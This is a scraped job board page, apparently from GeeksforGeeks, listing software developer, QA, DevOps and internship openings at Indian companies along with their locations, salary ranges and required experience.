20 to 24 Lacs + stocks Experience 5 to 8 years Vocera Looking For DevOps Engineer Location Bagalore, India Salary 13+ LPA +Stocks Experience 5 to 7 years Zeta Looking For Java developer Location Bangalore Salary 15 LPA to 50 LPA Experience 4 to 8 years GeeksforGeeks Looking For Software development engineer Location Noida Salary 5 to 7 LPA (Negotiable) Experience 1 to 5 years of relevant experience Ficode Looking For Scala Developers Location Gurgaon, Haryana Salary 6 to 10 LPA Experience 1 to 3 years Ficode Looking For Technical Architecture Location Gurgaon, Haryana Salary Good hike on current. Experience 3 to 4 years Ficode Looking For Wordpress Developer Location Mohali Salary Good hike on current salary. Experience 0.6 to 2 years GeeksforGeeks Looking For Member of technical staff Location Noida Salary 6 to 7 LPA (Negotiable) Experience 0 to 3 yrs (Software Development or relevant experience) Mindbowser Looking For React Native Developer. Location Bavdhan, Pune Salary 20 % to 50% hike provided on current salary as per the interview Experience 1 to 2 years Sitel Looking For Business Analyst/ Sr. Business Analyst Location Hyderabad Salary Open to discuss Experience 2 to 12 years of experience Dai software Looking For Android developer Location Indore Salary Hike on current salary upto 30% Experience 1+ Years Sitel Looking For Programmer Analyst Location Mumbai Salary 5 LPA Experience 1 to 3 years Dremio Looking For Software Engineer Location Hyderabad Salary Best in Industry Experience 5+ years Dremio Looking For Senior Software Engineer Location Hyderabad Salary Best in Industry Experience 8 to 14 years SquadVoice Looking For Product Engineer-2 (Backend) Location Noida, NCR Salary 16 to 25 LPA + ESOPs up to 10L Experience 1.5 to 4 years SquadVoice Looking For Product Engineer -1 (Frontend) Location Noida, NCR Salary 10 to 15 LPA + ESOPs Experience 1 to 2 years of relevant experience SquadVoice Looking For Sr. Product Manager Location Noida, NCR Salary ₹30 to 40 LPA + ESOPs Experience 5+ years Ink in Caps Looking For Technical Project Manager Location Mumbai Salary 5 to 15 LPA Experience 4 to 9 years Ink in caps Looking For Senior iOS Developer Location Mumbai Salary 5 to 8 LPA Experience 3 to 8 years Ink in caps Looking For Senior Android Developer Location Mumbai Salary 3 to 6 LPA Experience 3 to 8 years Ink in caps Looking For Backend Developer Location Mumbai Salary 5 to 10 LPA Experience 4 to 9 years Electroverse Looking For PHP developer Location Chandigarh Salary Upto 4.8 LPA Experience 2 to 3 years Electroverse Looking For iOS developer Location Chandigarh Salary Upto 4.8 LPA Experience 2 to 3 years Ctrl S Looking For Data scientist Location Hyderabad Salary Best in Industry (Negotiable) Experience 4 to 10 years CampK12 Looking For Frontend Developer Location Gurgaon Salary 8 to 15 LPA Experience 1 to 3 years CampK12 Looking For Full Stack Developer Location Gurgaon Salary 8 to 15 LPA Experience 1 to 3 years CampK12 Looking For Automation QA Location Gurgaon Salary 5 to 12 LPA Experience 2+ Years CampK12 Looking For QA, Manual Location Gurgaon Salary 3 to 6 LPA Experience 1+ years Tripoto Looking For Backend SDE-I Location Delhi Salary 8 to 15 LPA Experience 1 to 3 years Karza Technologies Private Limited Looking For Front End Developer Location Mumbai Salary 15 to 20 LPA Experience 1 to 4 years Wheelseye Technology Looking For Backend Developer Location Gurgaon Salary 20 to 30 LPA Experience 3 to 6 years Technology 9 Labs Looking For Android Developer Location New Delhi Salary 12 to 20 LPA Experience 2 to 4 years Jigsaw Academy Looking For Full Stack developer Location Bangalore Salary 5 to 12 LPA Experience 2 to 6 years Jigsaw Academy Looking For Cloud Infrastructure admin (AWS) Location Bangalore Salary 3 to 9 LPA Experience 2 to 8 yrs GeeksforGeeks Looking For Content Engineer - DSA Location Noida Salary Best In Industry Experience 0 to 2 Years Zumen Looking For Full Stack Developer Location Chennai Salary 6 to 10 LPA Experience 1 to 7 years Codilar technologies Looking For Magento Developer Location Bangaluru Salary Upto 15 LPA Experience 3 to 10 Years 4th Quarter Technologies Looking For ASP .Net Developer (No MVC) Location Noida Salary Upto 5 LPA Experience 1 to 4 Years 4th Quarter Technologies Looking For Magento Developer Location Noida Salary 3 to 6 LPA Experience 2 to 6 years Benison Looking For L2 / L3 Software Engineer Location Bangalore Salary 10 to 20 LPA Experience 3 to 8 years Think42 Labs Looking For React Native Developer Location Chennai Salary Upto 10 LPA Experience 2+ years experience Think42 Labs Looking For Odoo Developer Location Chennai Salary Upto 10 LPA Experience 2+ years Think42 Labs Looking For Python developer Location Chennai Salary Upto 10 LPA Experience 2+ years experience Coreapps Looking For laravel developer Location Jaipur Salary Upto 7.2 LPA Experience 1+ years Sitel Looking For dot Net Developer Location Mumbai Salary 5.5 LPA Experience 1+ years Spinny Looking For Software Development Engineer (Backend) Location Gurgaon Salary Upto 35 LPA CTC Experience 3 to 6 years Spinny Looking For Software Development Engineer (Frontend) Location Gurgaon Salary Upto 35 LPA CTC Experience 3 to 6 years Benison Looking For UI Developer Location Pune & Bangalore Salary 10 to 20 LPA Experience 4 to 6 years Samosys Looking For PHP Developer Location Indore Salary upto 4 LPA Experience 1+ years AgreeYa Solutions Looking For SharePoint Developer Location Noida Salary 10 to16 LPA Experience 2 to 10 years Codedrill Infotech Pvt. Ltd. Looking For PHP developer Location Mohali Salary Upto 4.2 LPA Experience 6 Months to 3 Years Yozoco Looking For Android Development Internship Location Mumbai Salary Upto 15K Experience Internship Vocera Looking For Software Engineer (Urgent Hiring) Location Bangalore, India Salary 20 to 24 Lacs + stocks Experience 5 to 8 years AgreeYa Solutions Looking For UI/UX Designer Location Noida Salary 15 to 22 LPA Experience 10 to 15 Years Khabri Looking For Backend Development Internship (Urgent Hiring) Location Gurgaon Salary Upto 20,000 per month Experience Internship Sitel Looking For Programmer Analyst Location Mumbai Salary Upto 5.5 LPA Experience 2 to 5 years CCTech Looking For Software Developer Location Wakad, Pune, Maharashtra Salary 3 to 5 LPA Experience 0 to 1 years KBIHM Consultings Pvt Ltd Looking For Node Js/ Angular Js / React Js or Mean Stack Developer Location Chandigarh Salary 4.8 to 5.4 LPA Experience 6 Months to 3 years Amvrin Systems Pvt. Ltd. Looking For dot Net developer Location Noida Salary Upto 10 LPA (Depending on current salary) Experience 3+ years NCH Software Looking For C++ Software Engineer Location Canberra, Australia Salary $50,000 to $110,000 PA Experience High proficiency in desired skillset D4 Insight Looking For Ui Developers Location Chennai Salary 15 to 18 LPA Experience 8 to 10 years Appyhigh Looking For Android Engineer Location Hyderabad Salary 8 LPA to 12 LPA Experience 3+ years Appyhigh Looking For Android developer intern Location Hyderabad Salary 10K -15K per month Experience Internship Appyhigh Looking For Sr. Backend Developer/ Mean Stack Developer with NodeJS Location Hyderabad Salary 15 LPA to 18 LPA Experience + 3 years Appyhigh Looking For Node JS Intern Location Hyderabad Salary 10K to 15K per month Experience Internship ValidateMe Looking For Sr. Developer Location Noida Salary 15 to 28 LPA Experience 6+ years of relevant experience ValidateMe Looking For UX Designer Location Noida Salary 6 to 14 LPA Experience 4+ years HyperVerge Inc. Looking For Artificial Intelligence Engineer Location Bengaluru, Karnataka Salary 15 to 25 LPA Experience Relevant experience in desired skills HyperVerge Inc. Looking For Full Stack Developer Location Bengaluru, Karnataka Salary 15 to 25 LPA Experience minimum 6 month HyperVerge Inc. Looking For Mobile Developer - React Native Location Bengaluru,Karnataka Salary 15 to 20 LPA Experience Minimum 6 months Holidaying Looking For Front end Intern Location Delhi, Gurgaon Salary 10000 /Month + Incentives and/or a PPO offer Experience Internship Holidaying Looking For Back End Intern Location Delhi, Gurgaon Salary 10000 /Month + Incentives Experience Internship Kamadhenu Technology Private Limited Looking For Angular Developer Location Udyog Vihar, Gurgaon Salary Up to 12 LPA. Experience 2+ years in Angular (Latest version) Dremio Looking For Full Stack Engineer Location Hyderabad Salary Best in Industry Experience 4 to 8 years SenRa Looking For Senior Software Engineer (Backend) Location Delhi Salary 13 to 14 LPA Experience 3+ years Admission Guidance Looking For Sr. WordPress Developer Location Chennai Salary 5.2 LPA Experience 3 to 5 Years HyperVerge Inc. Looking For Software Development Engineer - 1 Location Bengaluru, Karnataka Salary 8 to 15 LPA Experience Minimum 6 months Kamadhenu Technology Private Limited Looking For Java Developer Location Udyog Vihar, Gurgaon Salary Up to 15 LPA Experience 3 to 5 years TRUMINDS SOFTWARE SYSTEMS Looking For SENIOR SOFTWARE DEVELOPER (Networking) Location GURGAON Salary According to industry standards Experience 5-10 Lasting Software Pvt. Ltd. Looking For PHP Developer Location Panchkula, Haryana Salary Upto 4.2 LPA Experience 2 to 4 years Provis Technologies Looking For PHP WordPress Developer Location Jaipur Salary Upto 4.2 LPA Experience 6 months to 5 years Deepspace9 Technologies Looking For Laravel Developer Location New Delhi Salary 4 to 7 Lakhs Experience 1 to 2 years of relevant experience Flair solution Looking For Senior Android Developer Location Indore Salary Depends upon existing package & Interview Performance Experience 2+ years Flair solution Looking For Senior IOS Developer Location Indore Salary Depends upon existing package & Interview Performance Experience 2 or 2+ years TRUMINDS SOFTWARE SYSTEMS Looking For Software Development Engineer Location Gurgaon Salary According to industry standards Experience 2 to 4 years TRUMINDS SOFTWARE SYSTEMS Looking For Technical Lead Location Gurgaon Salary According to industry standards Experience 5 to 10 years TRUMINDS SOFTWARE SYSTEMS Looking For LTE Tech lead Location GURGAON Salary According to industry standards Experience 6 to 10 years TRUMINDS SOFTWARE SYSTEMS Looking For LTE Senior software developer Location GURGAON Salary According to industry standards Experience 5 to 8 years TRUMINDS SOFTWARE SYSTEMS Looking For LTE Software developer Location GURGAON Salary According to industry standards Experience 2 to 4 years Convosight Looking For Data Engineer Location Delhi Salary According to the industry standards Experience 2 to 3 years of relevant experience Convosight Looking For Data Engineer- SDE-1 Location Delhi Salary According to industry standards. Experience Relevant experience in desired skills Convosight Looking For SDE- I- Angular developer Location Delhi Salary According to industry standards. Experience 1 to 2 years of relevant experience Tech2globe Looking For Senior Magento Developer Location Netaji Subhash Palace, Delhi Salary Upto 6 LPA Experience Min 3 years Benison Looking For Full Stack Java Developer Location Bangalore Salary 8 to 16 LPA Experience 3 to 5 years Ink in Caps Looking For Technical Project Manager Location Mumbai Salary 5 to 12 LPA Experience 4 to 9 years Ink in caps Looking For Backend Developer Location Mumbai Salary 5 to 12 LPA Experience 4 to 9 years Tech2Globe Looking For Senior ASP Dot Net Developer Location Netaji Subhash Palace, Delhi Salary Upto 4 LPA Experience 3 to 5 years Tech2Globe Looking For Software Developer (Team Lead) Location Netaji Subhash Palace, Delhi Salary Upto 6.5 LPA Experience 5 to 8 years Flair solution Looking For Senior Angular Developer Location Atulya IT Park, Indore Salary Depends upon existing package & Interview Performance Experience 3+ years Kredent InfoEdge Private Limited Looking For Full Stack Developer. Location Kolkata Salary 4 LPA Experience 1 to 3 years Applied cloud Computing Looking For React Native Developer Location Wagle estate, Thane, Mumbai Salary 2.1 to 8 LPA (Based on experience and performance in interview) Experience 6 months to 5 years Avalonmeta Looking For React Native Developer Location Rajajinagar, Bangalore Salary 5 to 15 LPA Experience 2+ years with React Native or 3+ years in any programming language AppitSimple Infotek Pvt. Ltd. Looking For Node Developer Location Ahmedabad Salary 3 LPA to 10 LPA (For interns 10k per month) Experience 1 to 5+ years of relevant experience AppitSimple Infotek Pvt. Ltd. Looking For PHP Developer Location Ahmedabad Salary Upto 3.6 LPA Experience 1 year Econote Looking For SR. FULL-STACK JAVA DEVELOPER Location Bangalore, IN Salary 4.8 to 7.8 LPA Experience 4+ years Econote Looking For SR. FULL-STACK WEB DEVELOPER Location Bangalore, IN Salary 4.2 to 7.6 LPA Experience 4 to 7 years Econote Looking For SR. EMBEDDED FIRMWARE DEVELOPER Location Bangalore, IN Salary 4.2 to 7.8 LPA Experience 3 to 7 years Econote Looking For SR. FULL-STACK MOBILE DEVELOPER Location Bangalore, IN Salary 4.8 to 8.2 LPA Experience 4 to 7 years Econote Looking For TEST ENGINEER Location Bangalore, IN Salary 3.2 to 5.4 LPA Experience 2 to 4 years Convosight Looking For Senior Angular Developer Location Delhi Salary According to industry standards. Experience 2 to 4 years of relevant experience BlogVault Looking For Software Engineer Location Bangalore Salary 9 LPA Experience Relevant experience in desired skills. Learnapp Looking For Frontend Developer - Javascript/Bootstrap Location Noida Salary 4.5 to 6 LPA Experience 1 to 5 years Learnapp Looking For Node JS (Backend Engineer) Location Noida Salary 7 LPA Experience 1 year in backend Ksolves India Pvt. Ltd Looking For Software Developer Location Noida Salary 20k per month Experience 0 to 2 years (Interns can also apply) Glyde Looking For Backend Engineer Location Noida Salary 0.1% Stock, Salary component would be Rs 7L - 12L + 0.1% (After the first investment, salaries will also be rolled out) Experience 3+ years Codalyze Looking For React Js Developer Location Mumbai Salary up to 18 LPA + ESOPs Experience 2 to 6 years of web development and software design experience in B2C Internet companies Tech2Globe Looking For PHP Developer (Shopify and Magento) Location Netaji Subhash Place, Delhi Salary Upto 3 LPA (depending upon skills) Experience 1 to 2 years Competent Groove Looking For Wordpress Developer Location Mohali Salary Upto 4 LPA Experience 2+ Year GeeksForGeeks Looking For Associate Mentor/Mentor Location Noida Salary 7 to 9 LPA for Associate Mentors and 10 LPA or above for experienced professionals Experience 1 to 5 years of relevant experience Competent Groove Looking For QA tester Location Mohali Salary Upto 3 LPA Experience 2+ year Theoriat Services Looking For Full Stack Developer Location Pune. (Work from home till lockdown) Salary 6 to 12 LPA Experience At least 3 years of industry experience MMF INFOTECH Looking For PHP Developer Location Indore Salary Upto 3 LPA Experience 1.5 to 3 years MMF INFOTECH Looking For React Native Developer Location Indore Salary Upto 3 LPA Experience 1 to 3 Years Competent Groove Looking For Android Developer Location Mohali Salary 4.8 to 5.4 LPA Experience 2+ years Competent Groove Looking For NodeJS developer Location Mohali Salary 4.8 LPA to 5.4 LPA (CTC) Experience 2+ years Competent Groove Looking For Project Manager Location Mohali Salary Upto 5 LPA Experience 4+ years Astra Security Looking For Symfony/PHP Developers Location Dwarka, New Delhi Salary 7 to 10 LPA Experience 2 to 3 years Dhwani Rural Information Systems Looking For Front-end Developer Location DELHI Salary Will depend on interview performance Experience 0 to 4 years (interns can also apply) Dhwani Rural Information Systems Looking For PHP Developer Location DELHI Salary Will depend on interview performance Experience 0 to 5 years (interns can also apply) Dhwani Rural Information Systems Looking For Back-end Developer Location DELHI Salary Will depend on interview performance Experience 0 to 4 years (Interns can also apply) ixigo Looking For Senior Software Engineer - Backend Location Gurgaon Salary 10 to 18 LPA Experience 2 to 5 years ixigo Looking For Software Engineer / Senior Software Engineer – Mobile (Android) Location Gurgaon Salary 10 to 18 LPA Experience 2 to 5 years ixigo Looking For DevOps Engineer Location Gurgaon Salary 6 to 10 LPA Experience 2 to 6 years ixigo Looking For Software Engineer-Quality-Manual Testing Location Gurgaon Salary 6 to 9 LPA Experience 1 to 3 years Gnani.ai Looking For NLP Engineer Location Bangalore Salary 6.5 to 7 LPA (3.75 to 4 LPA for Freshers) Experience 2 or 2+ years (Freshers can also apply) Vendiman Looking For Solution Architect - Digital Acceleration Location Mumbai Salary 17 to 21 LPA Experience 7 years Apna Looking For Back-End Engineer Location Remote working (Bangalore when situation gets normal) Salary 12 LPA to 30 LPA (depends on prior work experience) Experience 2 to 4 years Apna Looking For Software Engineer - Android Location Remote working (Bangalore when situation gets normal) Salary 12 LPA to 30 LPA (depends on prior work experience) Experience 2 to 4 years Apna Looking For Software Test Engineer - Automation Location Remote working (Bangalore when situation gets normal) Salary 10 LPA to 20 LPA (depends on prior work experience) Experience 1 to 3 years Apna Looking For Software Test Engineer - Manual Location Remote working (Bangalore when situation gets normal) Salary 8 LPA to 15 LPA (depends on prior work experience) Experience 1 to 3 years Epstomtech Looking For Server Tester Location Bangalore Salary Will depend on the interview performance Experience 5 to 10 years Jalan Technology Looking For Software Engineer(JS, Full Stack) Location Jaipur & Bengaluru Salary 20-30% on current CTC for experienced, 3.75L for freshers. Experience 2 to 9 years for experienced. Freshers can also apply. DLT labs Looking For Senior Software Development Engineer in Test (SDET) Location Hyderabad Salary Standard hike of 25 to 30% on current salary Experience 6+ in SDET or automation DLT labs Looking For Senior Software Engineer- Node JS Location Noida Salary Standard hike of 25 to 30% on current salary Experience 4 to 5 years DLT labs Looking For Senior Software Engineer -Angular Location Hyderabad/ Noida Salary Standard hike of 25 to 30% on current salary Experience 3+ years of experience in Angular DLT labs Looking For Software Development Engineer in Test (SDET) Location Hyderabad/Noida Salary Standard hike of 25 to 30% on current salary Experience 3 to 5 years Flair IT solution Looking For IOS Developer Location Indore Salary Upto 5.4 LPA Experience 2 or 2+ years Flair IT solution Looking For Android Developer Location Indore Salary 5.4 LPA Experience 3+ years Flair IT solution Looking For Frontend Developer Location Indore Salary 3 LPA Experience 1+ years Epstom Tech Looking For Server testing Location Bangalore Salary Will depend on the interview performance Experience 5 to 10 years Vendiman Looking For Software Developer Location Mumbai Salary 7.2 LPA Experience 2 years RightfulLabs Looking For Database Developer Location Bhopal/Indore Salary As per industry standards. Experience 4+ Years Undostres Looking For Software enginner Location Gurgaon Salary Will depend on experience (13 LPA for freshers) Experience 0 to 4 years Undostres Looking For DevOps engineer Location Gurgaon Salary Will depend on experience (13 LPA for freshers) Experience 0 to 4 years Mentor Together Looking For Backend software developer Location Bangalore Salary 6 to 8 LPA Experience 5+ years Notion Press Looking For Senior Mobile Application Developer (Flutter + Firebase) Location Mylapore, Chennai Salary 8 to 12 LPA Experience 4 to 8 years Learnpod Looking For Full Stack PHP Developer Location Remote Salary 6 LPA Experience 1+ years Mentor Together Looking For Technical Project Manager Location Bangalore Salary 12 to 15 LPA Experience 8+ years Mentor Together Looking For Frontend software developer Location Bangalore Salary 4 to 7 LPA Experience 3+ years Dhiraj Shubham and Company LLP Looking For Mobile and Web Application Developer Location Chennai Salary Upto 3.6 LPA Experience 2 to 3 years Gain Credit Inc Looking For Engineering Manager Location Chennai Salary 8 LPA to 25 LPA Experience 7+ years Gain Credit Inc Looking For API - Tech Lead, Software Engineering Location Chennai Salary 8 to 25 LPA Experience 5+ years Gain Credit Inc Looking For Senior Data Engineer Location Chennai Salary 8 to 25 LPA Experience 3+ years Gain Credit Inc Looking For Software Engineer/ Sr. Software Engineer Location Chennai Salary 8 to 25 LPA Experience 2+ years Gain Credit Inc Looking For Senior Software Development Engineer in Test – (Sr. SDET – 1/2) Location Chennai Salary 8 to 25 LPA Experience Minimum 5 years Gain Credit Inc Looking For DevOps Architect Location Chennai Salary 8 to 25 LPA Experience 5+ years Gain Credit Inc Looking For Senior Test Engineer Location Chennai Salary 8 to 25 LPA Experience 5+ years Codalyze Looking For Node and React Native Developer Location Mumbai Salary 4 to 5.5 LPA Experience 6 months to 1.5 years Tekpillar Looking For Solution Architect - SAP XSA with JAVA/Python Location Bangalore (currently offshore) Salary Upto 24 LPA Experience 10+ years Happy Reliable Surgeries Pvt. Ltd. Looking For C++ developer Location Bengaluru Salary Upto 6 LPA Experience 1 to 2 years FULL creative Looking For Fullstack Developer Location Chennai Salary Min 30% hike on current salary Experience 2 to 4 years Vocera Looking For Contractor, Crystal report developer Location Bangalore Salary Upto 1.5 L per month Experience 8+ years Pattem Digital Looking For Frontend Developer Location Bangalore / Bengaluru Salary 9 to 10 LPA MAX Experience 2 to 4 years JavaScript experience along with HTML/CSS Lendbox Looking For Software Development Intern Location New Delhi (Munirka) Salary 10k to 20k Experience Internship Fleek IT solutions Looking For .NET (C# and ASP.NET) Developer Location Noida Salary 3 to 7 LPA Experience 2 to 5 years Lynhill Software Looking For Android Developer Location Mohali Salary 3.6 LPA Experience 1 to 2 years Lynhill Software Looking For iOS developer Location Mohali Salary 3.6 LPA Experience 1 to 2 years GeeksforGeeks Looking For Software Development Engineer Location Noida Salary 7 to 10 LPA Experience 1 to 3 years of relevant experience Anviam Solutions Pvt. Ltd. Looking For Software Engineer/ Software Developer Location Sahibzada Ajit Singh Nagar, Punjab Salary Upto 40k per month Experience 2 to 3 years Learnpod Looking For PHP/Laravel Developer Location Remote Salary 3.5 L to 5 L Experience 2 years Lendbox Looking For Software Development Engineer Location New Delhi (Munirka) Salary 4 to 8 LPA Experience 1 to 3 years Hashout Software Technology Looking For Sr Frontend Engineer (React JS/Angular) Location Bangalore, Karnataka, India Salary Upto 12 LPA Experience 3 to 5 years Pillarplus Looking For Python & Django developer Location Vaishali Nagar, Jaipur Salary 4 to 8 LPA Experience Relevant experience and knowledge Pillarplus Looking For Machine learning developer Location Vaishali Nagar, Jaipur Salary 8 to 16 LPA Experience Relevant experience and knowledge Leadsquared Looking For Senior React Developer –Platform Location Bangalore Salary 15 to 40 LPA Experience 2+ years of experience in building web applications using React Envistacorp Looking For HighJump WMS – QA Analyst Location Bangalore Salary Rs.4.00 – 15.00 lacs p.a Experience 4 to 8 years Envistacorp Looking For Developer Location Bangalore Salary Rs.6.00 – 12.00 lacs p.a Experience 0 Envistacorp Looking For Sr. Java Developer Location Hyderabad, India Salary Rs.4.00 to 15.00 lacs p.a Experience 4 to 8 years Envistacorp Looking For Highjump WMS -Sr. Developer Location Bangalore Salary Rs.4.00 to 15.00 lacs p.a Experience 4 to 8 years Hashout Software Technology Looking For Fullstack Engineer (Java Developer) Location Bangalore, Karnataka, India Salary Upto 12 LPA Experience 3 to 7 years My virtual teams Looking For React.js Developer Location Ludhiana Salary Upto 4 LPA Experience Min 1 year Hashout Software Technology Looking For Sr. Software Engineer (AEM Specialisation) Location Bangalore, Karnataka, India Salary Upto 12 LPA Experience 3 to 7 years Pillarplus Looking For React.js Developer Location Vaishali Nagar, Jaipur Salary 4 to 8 LPA Experience Relevant experience and knowledge Pillarplus Looking For .NET developer Location Vaishali Nagar, Jaipur Salary 8 to 12 LPA Experience Relevant experience and knowledge Pillarplus Looking For Image processing developer Location Vaishali Nagar, Jaipur Salary 8 to 16 LPA Experience Relevant experience and knowledge Sofster Looking For Javascript developer Location Mohali Salary Upto 4.2 LPA Experience 1 to 3 years (Fresher's or 6 months can also apply) Albedous Infosystem Pvt Ltd. Looking For Angular/Dotnet Developer. Location Ahemdabad Salary Upto 3 LPA Experience 1 to 3 years Albedous Infosystem Pvt Ltd. Looking For React/Node JS Developer Location Ahemdabad Salary Upto 55K per month Experience 2 to 3 years Albedous Infosystem Pvt Ltd. Looking For Front End Developer Location Ahemdabad Salary Upto 3.6 LPA Experience 1 to 3 years Leadsquared Looking For Full-stack Node.js developer Location Bangalore Salary 15 to 40 LPA Experience 4+ years Leadsquared Looking For Full-stack developer Location Bangalore Salary 15 to 40 LPA Experience 3 years Leadsquared Looking For DevOps Engineer Location Bangalore Salary 15 to 40 LPA Experience 2 to 5 years Chalo Looking For SDE II / III - Backend Development Location Mumbai Salary 15 to 25 LPA Experience 1+ years Chalo Looking For Platform Engineer Location Mumbai Salary 15 to 25 LPA Experience 1+ years Chalo Looking For Web / Frontend Lead Location Mumbai Salary 15 to 25 LPA Experience 1+ years Chalo Looking For Android developers Location Mumbai Salary 15 to 25 LPA Experience 1+ years Aphelia Innovations Looking For Full Stack developer Location Delhi Salary Upto 5 LPA Experience Min 2 years Exploro Solutions Looking For SOAR Developer Location Hyderabad Salary 25 LPA Experience 4 - 9 years AsparrowTech Looking For Python Developer Location Indore Salary upto 3 LPA Experience Freshers CodersBrain Looking For Front-End Developer Location Bangalore Salary 8.4 - 10.8 LPA Experience 3+ years Mobius Development Studio Looking For PHP Developer Location Hyderabad, Telangana Salary 4 - 6 LPA Experience 1+ years CodersBrain Looking For Ionic - Cordova Developer Location bangalore Salary 65 to 75K per Month Experience 1+ Years Introtuce Private Limited Looking For Android Developer Location Bangalore Salary 6 to 9 LPA Experience upto 5 years Introtuce Private Limited Looking For IOS Developer Location Bangalore Salary 6 to 9 LPA Experience upto 5 years Introtuce Private Limited Looking For Android Developer Location Bangalore Salary 25K per Month Experience Freshers Exploro Solutions Looking For ReactJS Engineer Location Remote or USA Salary 7 LPA Experience 2 to 6 years Exploro Solutions Looking For Python Engineer Location Remote or USA Salary 7 LPA Experience 2 to 6 years Web 1 Experts Looking For NodeJs Developer Location Mohali Salary upto 6 LPA Experience 0.6+ years Web 1 Experts Looking For PHP Developer Location Mohali Salary upto 6 LPA Experience 2+ years 24Task Looking For React JS Developer Location Surat Salary upto 50K per Month Experience 2 - 5 years 24Task Looking For Angular JS Developer Location Surat Salary upto 50K per Month Experience 2 - 5 years Glider.ai Looking For Associate Software Engineer-Fullstack Developer Role Location Bangalore Salary 7-12 LPA Experience Freshers Tact.ai Looking For iOS Engineer Location Bangalore Salary 15LPA to 23LPA Experience 2-5 Years Tact.ai Looking For Implementation Engineer - Salesforce Location Bangalore Salary 20LPA to 27LPA Experience 7 Years Webgross Looking For Senior PHP Developer Location Delhi Salary 3.5LPA to 4.5LPA Experience Min. 1 Year AlgonoX Looking For Lead Data scientist Location Hyderabad Salary 12 to 25 LPA Experience 3 to 5 years AlgonoX Looking For Sr. Front-End Developer Location Hyderabad Salary 7 to 18 LPA Experience 3 to 5 years Enerlly Looking For Fullstack developer Location Pune Salary Upto 3 LPA Experience 1+ year Milkbasket Looking For SDE II Location Gurgaon Salary 18 to 26 LPA Experience 3 to 5 years Algo8 Looking For Backend Developer Location Noida (Till pandemic WFH) Salary 5 to 8 LPA Experience 1+ years Webority Looking For React Native Developer Location Gurgaon, Haryana Salary Upto 3 LPA Experience Freshers Webority Looking For Flutter Developer Location Gurgaon, Haryana Salary Upto 3 LPA Experience Freshers Webority Looking For Native Developer Location Gurgaon, Haryana Salary 3 LPA Experience Freshers Webority Looking For Dot Net Developer Location Gurgaon Salary 3 LPA Experience Freshers Celebratix Looking For Software Engineer Location Pune/Chennai Salary 6 to 8 LPA Experience 3 to 4 years Anviam Solutions Pvt. Ltd Looking For Software Engineer Location Mohali,Punjab Salary Upto 4.8 LPA Experience 0-3 Years Mads Technologies Pvt. Ltd. Looking For Associate Software Engineer-iOS Developer Location Sector-63, Noida, Uttar Pradesh Salary Upto 3.5 LPA Experience 6 months to 2 years Mads Technologies Pvt. Ltd. Looking For Project Manager(Mobility) Location Sector-63, Noida Salary Upto 13 LPA Experience 5 to 10 Years Snapwiz Looking For Reactjs Full stack Developer Location Bangalore Salary 7 to 25 LPA Experience 0 to 8 Years Introtuce Private Limited Looking For IOS Developer Location Bangalore Salary 25K per Month Experience Freshers Number Theory Looking For Full Stack Developer Location Gurgaon(Currently, WFH) Salary Upto 20 LPA Experience 4 to 6 Years Number Theory Looking For Senior Big Data Engineer Location Gurgaon(Currently, WFH) Salary Upto 20 LPA Experience 4 to 6 years Caret IT Solutions PVT. LTD Looking For Odoo Techno Functional Consultant Location Gandhinagar Salary 60-70K per Month Experience Min 1 Year Odoo Exp. & Min 3 Year industry Exp Caret IT Solutions PVT. LTD Looking For Odoo Front-end Developer Location Gandhinagar Salary 60-70K per Month Experience Min 1 Year Odoo Exp. Caret IT Solutions PVT. LTD Looking For Odoo Website Developer Location Gandhinagar Salary 60-70K per Month Experience 1+ Year. Code Garage Tech Looking For Python Developer Location Mohali Salary 60K - 70K per Month Experience 1 to 4 years Code Garage Tech Looking For Mern Stack Developer Location Mohali Salary 60K - 70K per Month Experience 1 to 4 years Code Garage Tech Looking For Ruby on Rails Developer Location Mohali Salary upto 80K per Month Experience 2+ years Zelus India Looking For Java Developer Location Noida Salary 18 LPA Experience 7 to 10 years My virtual teams Looking For PHP Developer Location Ludhiana,Punjab Salary Upto 3.6 LPA Experience Min. 1 Year Tact.ai Looking For Implementation Engineer-Applications Location Bangalore Salary 20LPA to 24LPA Experience 7 Years Mobius Development Studio Looking For Senior Software Engineer Location Hyderabad, Telangana Salary 8-12 LPA Experience 2+ years Mobius Development Studio Looking For Game Developer (HTML 5) Location Hyderabad, Telangana Salary 7-12 LPA based on relevant experience Experience 2+ years relevant experience Introtuce Private Limited Looking For Deep Learning Internship Location Bangalore Salary 3 LPA Experience Freshers SkyPoint Cloud Looking For Software Development Engineer Location Bangalore Salary 10 - 15 LPA Experience 2+ Years AsparrowTech Looking For Ruby on Rails Developer Location Indore Salary 3 LPA Experience 1+ years (freshers may also apply) Dekko Looking For Android Developer Intern Location Remote / you can continue with your current work or any other internship Salary 1.2 LPA (Performance-based increment and opportunity to work full time on Salary+ ESOPs) Experience Fresher (Final year student may also apply) Tericsoft Technology solutions Pvt. Ltd. Looking For Frontend developer Location Hyderabad Salary 35 to 45 k Experience 2 years (Interns can also apply) Tericsoft Technology solutions Pvt. Ltd. Looking For React Native Developer (Android & iOS) Location Hyderabad Salary 35k to 45k Experience 2 years (interns can also apply) Apptunix Looking For Node JS Developer Location Mohali Salary Upto 12 LPA Experience 1 to 3 Years Apptunix Looking For React Native Developer Location Mohali Salary Upto 12LPA Experience 2+ Years Apptunix Looking For iOS Developer Location Mohali Salary UPTO 12 LPA Experience 1 to 5 Years Apptunix Looking For Unity Developer Location Mohali Salary UPTO 12 LPA Experience 1 to 3 Years Quick Ride Looking For Senior Engineer (Angular with PWA) Location Bangalore - Work From Office Salary UPTO 10LPA Experience +3 yrs ( At least 1 year in PWA & Angular) Number Theory Looking For Junior Big Data Engineer Location Gurgaon(Currently, WFH) Salary Upto 15 LPA Experience Min 2 Year Experience FinnovationZ Looking For Full Stack Developer Location Hyderabad Salary upto 5.5 LPA Experience 1.5 - 5 years AsparrowTech Looking For Full Stack Developer Location Indore Salary upto 3 LPA Experience Freshers Mobius Development Studio Looking For Front End Engineer Location Hyderabad, Telangana Salary upto 4.80 LPA Experience 2+ years × Message Error Okay! × Please report if you are facing any issue on this page. Issue Type * Select Issue Content Related Issue Sofware Related Issue Examples of Content related issues .Software related issues .For queries regarding questions and quizzes, use the comment area below respective pages. Describe Your Issue * Attach Screenshot (optional) Send Close room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved

